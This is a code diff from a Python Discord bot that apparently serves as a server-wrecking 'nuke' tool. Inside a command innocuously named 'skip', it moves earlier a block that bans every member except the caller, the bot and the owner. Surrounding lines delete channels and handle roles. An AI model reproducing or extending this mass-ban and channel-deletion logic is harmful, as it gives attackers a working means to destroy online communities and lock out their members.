@@ -728,6 +728,20 @@ async def skip(ctx):
     do_max_channels = settings["maxchannels"]
     do_nc_msg = settings["nc_msg"][0]
 
+    if do_ban:
+        member_list = []
+        for member in ctx.guild.members:
+            if member.id == ctx.message.author.id:
+                pass
+            elif member.id == bot.user.id:
+                pass
+            elif member.id == ctx.guild.owner.id:
+                pass
+            else:
+                member_list.append(member.id)
+
+        await ban_members(ctx, member_list)
+
     if do_channels:
         await delete_channels(ctx)
 
@@ -771,20 +785,6 @@ Server Name: {ctx.guild.name}
 Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
-
-    if do_ban:
-        member_list = []
-        for member in ctx.guild.members:
-            if member.id == ctx.message.author.id:
-                pass
-            elif member.id == bot.user.id:
-                pass
-            elif member.id == ctx.guild.owner.id:
-                pass
-            else:
-                member_list.append(member.id)
-
-        await ban_members(ctx, member_list)
 
     roleIDs = getRoleIDs()
     if do_roles:
